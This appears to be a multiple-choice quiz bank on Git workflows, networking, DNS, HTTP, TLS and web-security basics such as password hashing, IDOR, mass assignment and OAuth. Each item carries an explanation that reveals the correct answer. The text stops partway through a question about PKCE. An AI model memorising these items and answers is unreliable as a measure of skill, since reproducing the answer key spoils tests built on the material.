title: What gets committed after re-editing a staged file
question: You edit app.js, run `git add app.js`, then edit app.js again and run `git commit` (no -a). Which version of app.js is committed?
options: The latest version currently in the working tree
The version that existed when you ran git add
Both versions, recorded as two separate commits
Neither, because the file changed after staging
explanation: git commit records the index (staging area), and git add copies the file's content into the index at that moment. Later edits stay only in the working tree until you add them again; git commit -a would stage tracked modifications first, which is why the newest version is not used here.

title: Ignored file still shows as modified
question: You add `.env` to .gitignore, but `git status` still reports changes to .env. What is going on?
options: .gitignore only takes effect after the .gitignore file itself is committed
Patterns in .gitignore need a leading slash before they match any file
.env is already tracked; run git rm --cached .env so the rule applies
Git caches ignore rules until you run git gc to refresh them
explanation: gitignore only prevents untracked files from being added; files already in the index stay tracked no matter what the patterns say. git rm --cached removes the file from the index while keeping it on disk, and after that commit the ignore rule takes effect. Committing .gitignore, leading slashes and gc are irrelevant to this behaviour.

title: Commits made in detached HEAD
question: You run `git checkout v1.2.0`, make two commits, then `git switch main`. What happens to those two commits?
options: No branch points at them; only the reflog keeps them until gc
They are automatically appended to main when you switch back to it
The v1.2.0 tag is moved forward to point at the newest of the two commits
They never existed, because Git refuses to commit in detached HEAD state
explanation: Checking out a tag detaches HEAD: new commits are created but no branch ref points at them. When you switch away, nothing references them except the HEAD reflog, so they will eventually be pruned unless you create a branch (git switch -c fix <sha>). Tags never move on their own, and Git does allow commits while detached.

title: Merging when main has not moved
question: You branched `feature` from main and main has had no new commits since. What does `git merge feature` on main do by default?
options: Creates a merge commit with two parents to record the integration
Squashes all of feature's commits into one new commit on main
Rebases feature's commits onto main, giving them new hashes
Fast-forwards main to feature's tip, with no merge commit
explanation: When the current branch is an ancestor of the branch being merged, Git can simply move the ref forward: there is nothing to combine. A merge commit is only created when histories diverged or when --no-ff is given; squashing and rebasing require explicit commands.

title: Keep feature merges visible in history
question: Your team wants every merged feature to appear as a distinct unit in history, even when a fast-forward would be possible. Which merge command enforces this?
options: git merge --no-ff feature
git merge --ff-only feature
git merge --squash feature
git merge -s ours feature
explanation: --no-ff always creates a merge commit, so the feature's commits stay grouped under it and the whole feature can be reverted with one revert -m. --ff-only does the opposite (refuses anything but a fast-forward), --squash discards the branch topology entirely, and -s ours throws away the feature's changes.

title: -s ours versus -X ours
question: What is the difference between `git merge -s ours topic` and `git merge -X ours topic`?
options: -s ours resolves only conflicting hunks with our side; -X ours discards all of topic's changes
They are equivalent; -X is simply the short spelling of the -s ours strategy
-s ours ignores all of topic's changes; -X ours only favours our side in conflicts
-s ours keeps topic's side for conflicts; -X ours keeps the current branch's side
explanation: The ours merge strategy records a merge but keeps the current tree untouched, ignoring everything from the other branch. The ours strategy option (-X ours) is passed to the default ort strategy: non-conflicting changes from topic are still merged, and only conflicting hunks favour the current branch. Confusing the two silently drops work.

title: Reusing recorded conflict resolutions
question: A long-lived branch is repeatedly merged and rebased against main, and you keep resolving the same conflicts by hand. Which Git feature records your resolutions and reapplies them automatically?
options: git mergetool with the --auto flag
rerere, via rerere.enabled=true
git rebase --autosquash
merge.conflictStyle set to diff3
explanation: rerere (reuse recorded resolution) stores the pre- and post-image of each resolved conflict and replays the resolution when the same conflict appears again, during merges or rebases. --autosquash only reorders fixup! commits, conflictStyle only changes how markers look, and mergetool just launches an external tool.

title: Rebasing a branch others have pulled
question: You rebased `feature`, which two teammates had already pulled, and force-pushed it. What problem do the teammates face?
options: Their working trees are reset automatically and any uncommitted changes are lost
The remote rejects their next fetch until they delete and re-clone the repository
Nothing; Git matches rewritten commits by patch-id during fetch and syncs silently
Their branches still hold the old commits, so a plain pull duplicates the work
explanation: Rebasing creates new commits with new hashes. Teammates' branches are still based on the originals, so a default pull merges both histories and the same changes appear twice (often with conflicts). They must recover with git pull --rebase or git rebase --onto, as the RECOVERING FROM UPSTREAM REBASE section of git-rebase explains; fetches are never rejected and working trees are not touched.

title: Why --force-with-lease after a rebase
question: After rebasing your PR branch you must force-push. Why is `git push --force-with-lease` preferred over `--force`, and what can still defeat it?
options: It keeps the old remote commits as a backup ref; deleting that ref manually defeats it
It only forces when CI has passed on the new commits; skipping CI defeats it
It rebases the remote branch server-side; a protected branch rule defeats it
It fails if the remote moved since your last fetch; background fetches defeat it
explanation: --force-with-lease compares the remote ref with your remote-tracking ref and refuses if someone else pushed in the meantime. If an IDE or cron job fetches in the background, your tracking ref already includes their commit, so the lease passes and you overwrite it anyway; --force-if-includes (or an explicit expected sha) closes that gap. It has nothing to do with backups, CI or server-side rebases.

title: Transplanting a branch with --onto
question: `feature` was branched from `old-base` (itself unmerged), not from main. You want only feature's own commits replayed onto main. Which command does that?
options: git rebase main feature
git rebase --onto main old-base feature
git rebase --onto old-base main feature
git rebase -i main old-base
explanation: git rebase --onto <newbase> <upstream> <branch> takes the commits in upstream..branch (feature's own commits) and replays them on newbase. A plain git rebase main feature would also replay old-base's commits that are not in main, and the swapped arguments would move the wrong range onto the wrong base.

title: Reviewing what changed between two rebased versions
question: You rebased a 6-commit PR onto a main that moved by 40 commits and tweaked two commits while resolving conflicts. A reviewer wants to see only how your series changed, not upstream's changes. What should they use?
options: git range-diff between the old and new base..tip ranges
git diff between the old tip and the new tip of the PR branch
git log --cherry-mark on the symmetric difference of the two tips
git diff --merge-base from the old tip to the new tip
explanation: range-diff pairs up commits from two versions of a series and shows the diff of each pair's patches, so upstream changes that came along with the new base are excluded. A plain diff between the tips includes all 40 upstream commits, and cherry-mark only flags which commits are patch-equivalent without showing how they differ.

title: What git fetch changes
question: What does `git fetch origin` do to the local branch you currently have checked out?
options: It merges origin/main into the current branch
It rebases the current branch onto origin/main
Nothing; it only updates refs like origin/main
It resets the current branch to match the remote
explanation: fetch downloads objects and updates refs under refs/remotes/origin/, leaving your local branches, index and working tree alone. git pull is fetch followed by a merge (or rebase, depending on configuration); resetting would need an explicit git reset.

title: Make pull rebase instead of merge
question: Your local main has 2 unpushed commits and origin/main has 3 new ones. Which configuration makes `git pull` replay your commits on top of origin/main instead of creating a merge commit?
options: pull.ff=only
merge.ff=false
pull.rebase=true
fetch.prune=true
explanation: pull.rebase=true makes pull run git rebase after fetching, yielding linear history. pull.ff=only would refuse here because the branches have diverged, merge.ff=false forces merge commits, and fetch.prune only deletes stale remote-tracking refs.

title: Effect of reset --soft HEAD~1
question: What does `git reset --soft HEAD~1` do?
options: Moves the branch back one commit and leaves the changes unstaged in the working tree
Moves the branch back one commit and discards that commit's changes entirely
Creates a new commit that undoes the changes of the last commit
Moves the branch back one commit and leaves that commit's changes staged
explanation: --soft only moves the branch ref, so the index and working tree still contain the undone commit's changes, ready to be recommitted. --mixed (the default) also resets the index, leaving changes unstaged, --hard resets everything, and creating an inverse commit is what git revert does.

title: Undoing a commit already on shared main
question: A buggy commit was pushed to the shared main branch an hour ago and several teammates have pulled it. What is the safest way to undo it?
options: Reset main to the commit before it and force-push
Revert that commit with git revert and push it
Amend the commit to remove the bug and force-push
Drop it with an interactive rebase and force-push
explanation: git revert adds a new commit that inverts the bad one, so history only moves forward and nobody's clone is invalidated. Reset, amend and interactive rebase all rewrite published history, forcing every teammate to repair their local branches and risking lost work.

title: Recovering after reset --hard
question: You ran `git reset --hard HEAD~3` on a local branch and realise you needed those three commits. How do you get them back?
options: Find the old tip in git reflog and reset to it, e.g. HEAD@{1}
Run git revert HEAD~3 to restore the three dropped commits
They are gone; reset --hard deletes the commit objects immediately
Pull from origin, since reset --hard never affects committed history
explanation: reset --hard only moves the branch pointer; the commits stay in the object database and the reflog records where HEAD and the branch pointed before. Revert would create inverse commits of older history, and pulling only helps if the commits had been pushed. Objects are only pruned after reflog expiry and gc.

title: You pushed a live secret
question: You pushed a commit containing a live cloud access key to a public GitHub repository an hour ago. What is the correct first action?
options: Revoke and rotate the key, then purge it from history and coordinate the rewrite
Revert the commit so the key no longer appears at the tip of the branch
Rewrite history with git filter-repo and force-push, then rotate the key if logs show misuse
Make the repository private, which removes the key from forks and caches
explanation: Once pushed publicly, assume the secret is compromised: automated scrapers find keys within minutes, and clones, forks and cached views may already hold it. Rotation is the only action that actually neutralises it. A revert leaves the key in history, rewriting history cannot reach existing copies, and making the repo private does not remove forks or clones.

title: Re-merging a branch after reverting its merge
question: You reverted the merge of `feature` into main with `git revert -m 1 M`. After fixing feature with two new commits you merge it again, but most of the original changes are missing on main. Why, and what fixes it?
options: The -m 1 flag permanently excludes that branch from merges; recreate feature under a new name
The second merge used the ort strategy, which skips reverted hunks; merge with -s recursive
The reverted commits were garbage-collected; cherry-pick them back from the remote
Old feature commits count as already merged; revert the revert, then merge
explanation: Reverting a merge undoes its changes but does not undo history: the old feature commits are still ancestors of main, so the next merge only brings in commits after the old merge base. Reverting the revert restores those changes before merging the fixes, as described in the revert documentation. There is no blacklist, ort does not track reverts, and the commits are still reachable.

title: Backporting one fix to a release branch
question: Fix commit abc123 landed on main. You need exactly that fix on release/2.3 without any other commits from main, and want traceability. What do you run on release/2.3?
options: git merge --no-ff main
git rebase main release/2.3
git cherry-pick -x abc123
git revert abc123
explanation: cherry-pick applies the change introduced by a single commit as a new commit, and -x appends '(cherry picked from commit abc123)' to the message for traceability. Merging or rebasing on main would drag in every other commit, and revert would apply the inverse of the fix.

title: What git stash leaves behind
question: You have modified tracked files plus a new untracked file config.local, and run `git stash`. What is the state afterwards?
options: Both the tracked changes and config.local are stashed together
Only tracked changes are stashed; config.local stays in place
Tracked changes are stashed and config.local is deleted from disk
git stash refuses to run while untracked files are present
explanation: By default git stash saves changes to tracked files (index and working tree) only. Untracked files are left untouched unless you pass --include-untracked (-u), or --all to also include ignored files. Nothing is deleted and untracked files do not block stashing.

title: Annotated versus lightweight tags
question: What distinguishes an annotated tag from a lightweight tag?
options: An annotated tag automatically moves forward as new commits land on the branch
It is a separate object with tagger, date, message and optional signature
Only annotated tags can be pushed to a remote; lightweight tags stay local
An annotated tag can only point at merge commits, not at regular commits
explanation: git tag -a creates a tag object that stores who tagged, when, a message and optionally a GPG/SSH signature; a lightweight tag is just a ref pointing at a commit. Neither kind moves, both can be pushed, and both can point at any commit. Release tags should generally be annotated.

title: Finding a regression among 1,000 commits
question: A regression appeared somewhere in the last 1,000 commits. You have a script test.sh that exits 0 when the behaviour is good and 1 when bad. What is the most efficient approach?
options: git log -S on the failing function name and inspect each matching commit
git blame on the failing file and test each commit it lists
git bisect start <bad> <good>, then git bisect run ./test.sh
Cherry-pick each commit onto the last good version and run the test
explanation: bisect performs a binary search over history, so 1,000 commits need about log2(1000), roughly 10 tests, and bisect run automates it using the script's exit code (125 marks a commit untestable). Pickaxe and blame only find commits that touched certain text, which may not be the cause, and cherry-picking each commit is linear and error-prone.

title: Reusing a branch after squash merge
question: Your PR was merged with GitHub's 'Squash and merge'. You keep working on the same branch and open a new PR, which now shows your old commits and conflicts. Why?
options: Squash merge deletes the branch's history on the server, leaving orphaned commits
GitHub requires a force-push to the branch after every squash merge
Squash merge rewrites earlier commits on main, so your branch's base changed
The squash commit has no link to your originals, so they look unmerged
explanation: Squashing creates one new commit on main with the combined changes but no parent link to your branch's commits, so from Git's view your original commits are still unmerged. The fix is to start new work from an updated main (or rebase --onto). Squash merging does not delete history or rewrite main.

title: Requiring checks and reviews before merge
question: Which GitHub feature lets you require passing status checks and at least one approving review before anything is merged into main?
options: Branch protection rules (or rulesets) on main
A CODEOWNERS file at the repository root
Merge settings defined in .gitattributes
A pre-commit hook committed to the repository
explanation: Protected branches enforce merge requirements on the server: required status checks, required reviews, linear history and more. CODEOWNERS only designates reviewers (and is enforced only when protection requires code owner review), .gitattributes controls merge drivers, and client-side hooks can be skipped.

title: Two green PRs that break main together
question: Two PRs each pass CI against main, but once both are merged the build breaks because of how they interact. Which GitHub feature is designed to prevent this?
options: Requiring linear history on main, so no merge commits are created
Requiring signed commits so every change on main is verified
A merge queue testing each PR with main and the PRs ahead of it
Dismissing stale approvals when new commits are pushed
explanation: Each PR was tested against a main that did not include the other PR. A merge queue builds temporary branches containing the latest main plus queued PRs and only merges when that combination passes. Linear history, signed commits and dismissing approvals do not test the combined result.

title: Layer that uses port numbers
question: In the TCP/IP model, which layer provides end-to-end communication between processes and identifies them with port numbers?
options: Internet layer
Link layer
Application layer
Transport layer
explanation: TCP and UDP live in the transport layer and use source and destination ports to multiplex many conversations between the same two hosts. The internet layer (IP) moves packets between hosts by address, the link layer handles the local medium, and applications sit on top of transport.

title: Ping works but HTTPS times out
question: `ping api.internal` succeeds, but `curl https://api.internal` hangs until it times out. Which conclusion is best supported?
options: IP reachability works; TCP 443 is likely filtered or nothing is listening
Name resolution is broken, because curl resolves names differently from ping
The physical link is flapping, which ping cannot detect but TCP can
The server's TLS certificate has expired, which makes the connection hang
explanation: A successful ping shows the name resolved and ICMP packets travel both ways at the network layer. A hang (rather than a refusal or TLS error) typically means TCP SYNs to port 443 are silently dropped by a firewall or security group. An expired certificate produces an immediate handshake error, not a timeout.

title: Usable hosts in a /26
question: How many usable host addresses does a traditional IPv4 /26 subnet provide?
explanation: A /26 leaves 32 - 26 = 6 host bits, giving 2^6 = 64 addresses. The network address and the broadcast address are not assignable to hosts, leaving 62. 30 is a /27 and 126 is a /25.

title: Is the destination on-link?
question: Host A is 10.0.1.100/25 and wants to send a packet to 10.0.1.200. What does A do?
options: ARPs directly for 10.0.1.200, because both addresses share 10.0.1.0/24
Sends it to the gateway: .200 is in 10.0.1.128/25, another subnet
Drops it, because a /25 network cannot route to other subnets
Broadcasts it to 10.0.1.255 so that the destination host picks it up
explanation: A /25 splits 10.0.1.0/24 into 10.0.1.0-127 and 10.0.1.128-255. A applies its own mask, sees the destination is off-link, and forwards to the gateway. Assuming a /24 is the classic mistake; hosts never broadcast unicast traffic to reach peers.

title: Peering with an overlapping CIDR
question: Your VPC uses 10.0.0.0/16 and a partner asks to peer their VPC, which uses 10.0.128.0/17. What is the problem?
options: A /17 is a larger network than a /16, so the partner must shrink their range first
RFC 1918 ranges cannot be routed between networks owned by different organisations
The ranges overlap, so routing is ambiguous without NAT or renumbering
Nothing; longest-prefix matching routes traffic correctly in both directions
explanation: 10.0.128.0/17 is the upper half of 10.0.0.0/16. Peering requires non-overlapping ranges, and even where a router accepts it, longest-prefix match would send traffic for your own 10.0.128.x hosts to the partner. A /17 is smaller than a /16, and private ranges can be routed privately between organisations.

title: TCP connection establishment
question: What is the correct sequence of the TCP three-way handshake?
options: SYN, ACK, SYN-ACK
SYN, ACK, FIN
ACK, SYN, SYN-ACK
SYN, SYN-ACK, ACK
explanation: The client sends SYN with its initial sequence number, the server answers with SYN-ACK carrying its own sequence number and acknowledging the client's, and the client ACKs the server's. Both sides then have synchronised sequence numbers; FIN is used for closing.

title: TIME_WAIT pile-up on outbound calls
question: A service opens a new HTTP connection per request to one backend. Under load it shows tens of thousands of sockets in TIME_WAIT and errors like 'cannot assign requested address'. What is the most effective fix?
options: Reuse connections with keep-alive and a connection pool
Lower the backend's listen backlog to shed load
Disable Nagle's algorithm on the client with TCP_NODELAY
Increase the server's TCP receive window size
explanation: The side that closes first holds the connection in TIME_WAIT for twice the maximum segment lifetime, and each one pins a source port for that destination. Opening and closing a connection per request exhausts the ephemeral port range. Pooling removes the churn; backlog, Nagle and window size do not affect port consumption.

title: Why voice calls use UDP
question: Why do real-time voice and video applications usually carry media over UDP instead of TCP?
options: UDP guarantees delivery with less header overhead than TCP does
TCP connections cannot traverse home NAT routers reliably
TCP stalls all data on a retransmit, and late audio is useless
UDP payloads are encrypted by default while TCP payloads are not
explanation: TCP must deliver bytes in order, so one lost packet blocks everything behind it until it is retransmitted, adding jitter. For live media it is better to skip a lost packet and conceal the gap. UDP makes no delivery guarantee, provides no encryption, and TCP works fine through NAT.

title: Large responses hang over a VPN
question: Over a new VPN tunnel, SSH works and small pages load, but large HTTPS downloads hang forever. A firewall in the path drops all ICMP. What is the likely cause?
options: A path MTU discovery black hole caused by the dropped ICMP
TCP window scaling is disabled, so transfers above 64 KB are refused
TLS session tickets expire in the middle of long downloads
Nagle's algorithm holds back the final segments of large responses
explanation: Tunnels add headers and lower the effective MTU. TCP sets Don't Fragment and relies on ICMP 'fragmentation needed' messages to learn the smaller path MTU; if a firewall drops them, full-size segments disappear while small packets pass. Fixes are allowing that ICMP type or clamping the TCP MSS on the tunnel. Window scaling limits throughput, it does not cause hangs.

title: CNAME at the zone apex
question: Your DNS provider will not let you create a CNAME for example.com itself pointing at a load balancer hostname. Why?
options: CNAME records only work for names with at least three labels
DNSSEC requires the apex to be an A record so it can be signed
Registrars forbid CNAMEs at the apex to protect the domain from hijacking
A CNAME cannot coexist with other data, and the apex needs SOA and NS
explanation: A CNAME declares that a name is an alias, so no other data may exist at that name. The zone apex always has SOA and NS records, so an apex CNAME would break the zone. Providers work around this with ALIAS/ANAME flattening or the newer HTTPS/SVCB records; label count, DNSSEC and registrars are not the reason.

title: Planning an IP cutover with DNS
question: You are moving an API to a new IP address. Its A record has a TTL of 86400 seconds. What is the right plan?
options: Switch the record and flush your own resolver; all clients update within minutes
Lower the TTL a day ahead, switch, and keep the old IP up until caches expire
Set the TTL to 0 at the moment of cutover so every cache refetches immediately
Change the NS records instead, because delegation changes bypass resolver caches
explanation: Resolvers may cache the old answer for the full TTL they received, so the lower TTL only helps after the old 24-hour TTL has expired everywhere. Changing the TTL at cutover affects nobody who already cached the record, flushing your own resolver does nothing for others, and NS records are cached too, often with long TTLs.

title: New hostname still returns NXDOMAIN
question: A script queried new.example.com just before you created the record. Now the record exists, but that resolver keeps returning NXDOMAIN for a while. Why?
options: NXDOMAIN answers stay cached until the resolver process is restarted
New records always need up to 48 hours to propagate through the registrar
The new A record's TTL has to count down once before it becomes visible
Resolvers cache NXDOMAIN for a time set by the zone's SOA record
explanation: Negative caching lets resolvers remember non-existence, for the minimum of the SOA record's TTL and its MINIMUM field. Until that expires the resolver will not ask again. Registrars are not involved in records inside your zone, and a record's TTL only governs how long the positive answer is cached.

title: DNSSEC lookups fail behind a firewall
question: Resolution of a DNSSEC-signed domain with large responses fails intermittently from a network whose firewall allows only UDP port 53 outbound. Others resolve it fine. What is happening?
options: Large answers are truncated (TC bit) and the TCP/53 retry is blocked
DNSSEC validation requires port 853, which this firewall does not allow
UDP checksums are invalid for any DNS message larger than 512 bytes
The firewall strips DNSSEC signatures, so resolvers reject the answers
explanation: When a response exceeds the UDP payload size negotiated via EDNS, the server sets the truncation bit and the client must retry over TCP. TCP support is mandatory for DNS implementations, so blocking TCP/53 breaks exactly those large responses. Port 853 is DNS over TLS, not DNSSEC, and checksum validity does not depend on size.

title: CDN served one user's page to another
question: Behind a CDN, a user reported seeing another user's account page. The response had `Cache-Control: public, max-age=600` and was rendered from the session cookie. What is the correct fix?
options: Add Vary: Accept-Encoding so each client gets its own copy
Mark personalised responses Cache-Control: private or no-store
Add an ETag so the CDN revalidates the page with the origin
Serve the page over HTTP/2 so each response uses its own stream
explanation: public allows shared caches such as CDNs to store the response and serve it to anyone requesting the same URL. private restricts storage to the user's browser and no-store forbids caching altogether. Vary: Accept-Encoding still shares across users, an ETag only enables revalidation, and HTTP/2 streams have nothing to do with caching.

title: Why HTTP/3 helps on lossy networks
question: HTTP/2 already multiplexes many requests over one connection. Why does HTTP/3 still perform better on lossy mobile networks?
options: HTTP/2 has no header compression, so its requests are far larger on the wire
HTTP/2 opens a separate TCP connection per request, multiplying handshakes
A lost TCP segment stalls all HTTP/2 streams; QUIC isolates streams
HTTP/3 drops TLS encryption, which removes a round trip from each request
explanation: HTTP/2 removed application-level head-of-line blocking, but all streams share one TCP byte stream, so a single loss delays every stream until retransmission. QUIC runs over UDP and tracks loss per stream. HTTP/2 does have HPACK header compression and uses one connection, and HTTP/3 always uses TLS 1.3, integrated into QUIC.

title: Browsers work, curl does not
question: After installing a new certificate, browsers load the site fine but curl and a Java client fail with 'unable to get local issuer certificate'. What is the most likely cause?
options: The server does not send the root CA certificate, which every client requires
The clients do not send SNI, so the server returns its default certificate
The certificate has expired, but browsers apply a grace period
The server sends only the leaf certificate, without the intermediate
explanation: Clients need a chain from the leaf to a trusted root, and the server should send the leaf plus intermediates. Browsers often hide the misconfiguration by using cached intermediates or fetching them via the AIA extension, while most libraries do not. Roots are already in the client's trust store and need not be sent; an SNI or expiry problem gives different errors.

title: TLS 1.3 handshake round trips
question: With a full TLS 1.3 handshake (no resumption, no 0-RTT) over an established TCP connection, how many round trips pass before the client can send application data?
explanation: In TLS 1.3 the client sends its key share in ClientHello, the server replies with its key share, certificate and Finished in one flight, and the client can send its Finished together with application data. TLS 1.2 needed 2 round trips; 0 round trips are only possible with resumption and early data.

title: Why 0-RTT data must be idempotent
question: Why do servers typically accept TLS 1.3 0-RTT early data only for idempotent requests such as GET?
options: Early data can be replayed by an attacker, repeating the action
Early data is sent unencrypted, so only public requests may use it
Early data is sent before SNI, so routing breaks for requests with bodies
The TLS specification limits early data to the HTTP GET method
explanation: 0-RTT data is encrypted with keys from a previous session's PSK, but the server cannot tell whether that first flight is being replayed, so a POST that charges a card could run twice. It is encrypted and SNI is in the same ClientHello. TLS knows nothing about HTTP methods; the restriction is an application-level policy.

title: Connection coalescing hits the wrong vhost
question: a.example and b.example share an IP and a certificate whose SAN covers both, but are configured as separate TLS vhosts. Browsers reuse the HTTP/2 connection opened for a.example to request b.example, and the server mishandles it. Which response makes the client retry on a fresh connection?
options: 400 Bad Request
503 Service Unavailable
421 Misdirected Request
426 Upgrade Required
explanation: HTTP/2 allows a client to coalesce requests for another origin onto an existing connection when the certificate covers it and the IP matches. If the server cannot serve that origin on that connection, 421 tells the client to retry on a new connection, where SNI will select the right vhost. 400 and 503 are not retried this way, and 426 asks for a protocol upgrade.

title: Every request comes from the proxy IP
question: Your app behind a reverse proxy logs the proxy's address as the client IP and rate-limits all users as one. What is the correct fix?
options: Read X-Forwarded-For or Forwarded, trusting only your proxy's entries
Always use the leftmost X-Forwarded-For value, regardless of where the request came from
Switch the load balancer to layer 4 so the app sees TCP from the proxy directly
Rate-limit by User-Agent string instead, since it passes through proxies unchanged
explanation: The proxy opens its own TCP connection, so the app must use the header the proxy adds. Clients can send forged X-Forwarded-For values, so take the entry appended by your trusted proxy (count from the right), not the leftmost. A layer 4 balancer does not change this without PROXY protocol or transparent mode, and User-Agent is trivially shared or spoofed.

title: Intermittent 502s behind a load balancer
question: An Application Load Balancer has a 60-second idle timeout and reuses keep-alive connections to backends. Backends close idle keep-alive connections after 5 seconds. Under light traffic you see sporadic 502s. Why?
options: The LB health checks are too frequent and mark healthy targets as down
The LB reuses a connection the backend just closed; raise backend timeout
HTTP/1.1 keep-alive is incompatible with load balancers, so it should be disabled
The backend's TCP receive buffer overflows when connections sit idle too long
explanation: When the backend closes a pooled connection the LB still considers usable, the next request sent on it fails and the LB returns 502. AWS documentation recommends an application idle timeout larger than the load balancer's. Health checks cause target removal, not intermittent 502s, and keep-alive to backends is normal.

title: Reaching a host behind NAT
question: Why can an external host not open a connection to a laptop behind a home NAT router unless port forwarding is configured?
options: ISPs drop all inbound packets addressed to residential IP addresses
TCP does not allow a host behind NAT to act as a server
The NAT router encrypts internal addresses, so the packet cannot be decrypted
NAT has no mapping for unsolicited inbound traffic, so it is dropped
explanation: A NAT router shares one public address among many private hosts and creates translation entries when inside hosts send traffic out. An unsolicited inbound packet matches no entry, so it is dropped. Port forwarding adds a static mapping. TCP has no such restriction, ISPs generally do not block all inbound, and NAT does not encrypt anything.

title: Stateless ACL breaks responses
question: A subnet's network ACL allows inbound TCP 443 from anywhere and outbound TCP 443 to anywhere. Clients connect to a web server in the subnet, but their connections never complete. Why?
options: Network ACLs only evaluate traffic between subnets, never to the internet
HTTPS also needs UDP 443 allowed for the TLS handshake to finish
The ACL is stateless, so replies to the ephemeral port are blocked
Outbound rules are evaluated before inbound rules, so the SYN is dropped
explanation: A stateful firewall or security group automatically permits return traffic for allowed connections. A stateless network ACL evaluates every packet independently, so server responses, which travel from port 443 to the client's ephemeral port, need an outbound rule covering the ephemeral range such as 1024-65535. TLS over TCP does not need UDP.

title: How a WebSocket connection starts
question: How is a WebSocket connection established?
options: An HTTP/1.1 GET with Upgrade: websocket and a 101 response
A dedicated UDP handshake on a separate port negotiated in advance
An HTTP POST answered with 200 OK, after which frames are streamed
A TLS extension negotiated in ClientHello that switches the protocol
explanation: The opening handshake is an HTTP request with Upgrade and Connection headers plus Sec-WebSocket-Key; the server proves it understood by returning 101 and Sec-WebSocket-Accept. The same TCP connection then carries WebSocket frames. Over HTTP/2, an extended CONNECT is used instead, but it is still HTTP, not UDP or TLS-level negotiation.

title: Users still get the old JavaScript
question: After each deploy, users get the old app.js from your CDN for hours. What is the standard fix?
options: Set max-age=0 on every static asset so the CDN always fetches from origin
Purge the whole CDN on each deploy while keeping the same filenames
Content-hashed filenames cached as immutable, with short-cached HTML
Append a random query string to each asset request in the browser
explanation: When the filename changes with the content, a new deploy produces new URLs, so old cached files never need invalidation and can be cached for a year. Only the small HTML document needs short or revalidated caching. max-age=0 and random query strings defeat caching, and purging the CDN does not clear browsers' caches.

title: WebSocket load skewed after scale-out
question: You scale a WebSocket service from 4 to 8 instances behind a load balancer, but the 4 original instances keep most of the load for hours. Why?
options: Load balancers cannot route WebSocket traffic to instances added after startup
Balancing happens per connection, and long-lived connections stay put
WebSocket frames are routed per message, but the balancer caches routes per client IP
The new instances must first complete a WebSocket handshake with each old instance
explanation: A load balancer chooses a target per new TCP connection. WebSocket connections can live for hours, so existing clients stay on the old instances and only new connections reach the new ones. Common fixes are least-connections routing plus having servers gracefully close a fraction of connections so clients reconnect and rebalance.

title: Storing user passwords
question: Which approach is most appropriate for storing user passwords in a new system in 2026?
options: SHA-256 with one application-wide salt
AES-256 encryption with the key kept in configuration
MD5 applied iteratively one thousand times
Argon2id with a unique random salt per password
explanation: OWASP recommends Argon2id, a memory-hard password hashing function with a per-password salt, so each hash must be attacked separately and GPU cracking is expensive. A single fast SHA-256 with a shared salt is cheap to brute force, encryption is reversible by anyone who gets the key, and 1,000 rounds of MD5 is still far too fast.

title: Why fast hashes are bad for passwords
question: Why is a salted SHA-256 hash still a poor choice for password storage?
options: It is fast, so GPUs can test billions of guesses per second
SHA-256 has practical collision attacks that let attackers forge a matching hash
SHA-256 cannot be combined with a salt without weakening its security properties
SHA-256 output is too long to store efficiently in common database columns
explanation: General-purpose hashes are designed for speed, which is exactly what an offline attacker wants. Password hashing functions such as Argon2id, scrypt, bcrypt or PBKDF2 add a tunable work factor to slow each guess. SHA-256 has no practical collisions, salts work fine with it, and its 32-byte output is small.

title: Long passphrases and bcrypt
question: Users of a bcrypt-based system notice that changing characters after the 72nd byte of a long passphrase does not affect whether they can log in. Why?
options: bcrypt normalises Unicode and drops characters outside the ASCII range
The cost factor is set too low, so bcrypt skips trailing input
bcrypt only processes the first 72 bytes of input and ignores the rest
The 16-byte salt overwrites the last part of the password internally
explanation: bcrypt has a 72-byte input limit; many implementations silently truncate longer inputs. OWASP notes this limit and recommends Argon2id for new systems; pre-hashing to work around it is risky and must be done carefully. Cost only changes iterations, and the salt is a separate parameter.

title: Migrating away from unsalted MD5
question: You inherit 2 million unsalted MD5 password hashes and want Argon2id protection without forcing a mass reset. What is the recommended approach?
options: Upgrade each user to Argon2id when they next log in and leave other accounts on MD5 until then
Crack the MD5 hashes offline to recover the passwords, then hash them with Argon2id
Add a salt column now and store the salt next to each existing MD5 hash
Wrap every hash as Argon2id(md5_hash) now, and rehash cleanly at next login
explanation: Layering Argon2id over the existing hashes protects every account immediately, including inactive ones that would otherwise sit as plain MD5 for years. On login you verify via the layered scheme and replace it with a clean Argon2id hash of the password. Cracking users' passwords is unethical and incomplete, and adding a salt to an already-computed hash adds nothing.

title: MFA that resists phishing proxies
question: Attackers use a reverse-proxy phishing kit that relays the real login page in real time. Which MFA method stops it?
options: Time-based one-time codes from an authenticator app
WebAuthn / FIDO2 passkeys, whose signatures are bound to the site's origin
One-time codes delivered by SMS
Push notifications with an approve button
explanation: With WebAuthn the browser includes the origin in what the authenticator signs, so a credential for bank.example never produces a valid assertion on the phishing domain. TOTP and SMS codes are typed by the user and can be relayed instantly, and push approvals can be relayed or fatigue-spammed.

title: Changing the ID in the URL
question: A logged-in user changes /api/invoices/1001 to /api/invoices/1002 and receives another customer's invoice. What is this vulnerability?
options: Cross-site request forgery against the invoices API
SQL injection through the invoice ID parameter
Session fixation on the authenticated user's session
Broken object-level authorization (IDOR)
explanation: The server authenticates the user but never checks that the requested object belongs to them. The fix is an ownership or permission check on every object access, not hiding or obfuscating IDs. No forged cross-site request, injected SQL or fixed session is involved.

title: Becoming admin via a profile update
question: `PATCH /api/users/me` binds the JSON body directly onto the User entity and saves it. An attacker sends `{"displayName":"x","role":"admin"}` and becomes an admin. What is the right fix?
options: Bind requests to a DTO with an allow-list of user-editable fields
Check in the UI that the role field is hidden for non-admin users
Validate that the role value is one of the known role names
Require HTTPS so attackers cannot add fields to the request body
explanation: This is mass assignment: the framework sets any property named in the request. Binding to a dedicated input model containing only fields users may change (or an explicit allow-list) prevents privilege fields from being set. UI hiding is bypassed with any HTTP client, validating role names still lets 'admin' through, and TLS does not stop the sender.

title: What OpenID Connect adds to OAuth
question: What does OpenID Connect add on top of OAuth 2.0?
options: Mandatory encryption of access tokens sent to resource servers
An ID token describing the authenticated user, making OAuth usable for login
Refresh tokens, which plain OAuth 2.0 does not define
A password grant that replaces authorization codes
explanation: OAuth 2.0 is an authorization framework for delegated API access; it does not tell the client who the user is. OIDC adds an identity layer: an ID token (a signed JWT with iss, sub, aud, exp, nonce) plus a UserInfo endpoint and discovery. Refresh tokens already exist in OAuth 2.0 and the password grant is discouraged.

title: What PKCE protects
question: A mobile app uses the OAuth authorization code flow with PKCE. Which attack does PKCE specifically prevent?
options: Theft of access tokens from browser storage through XSS
Cross-site request forgery against the resource server's API
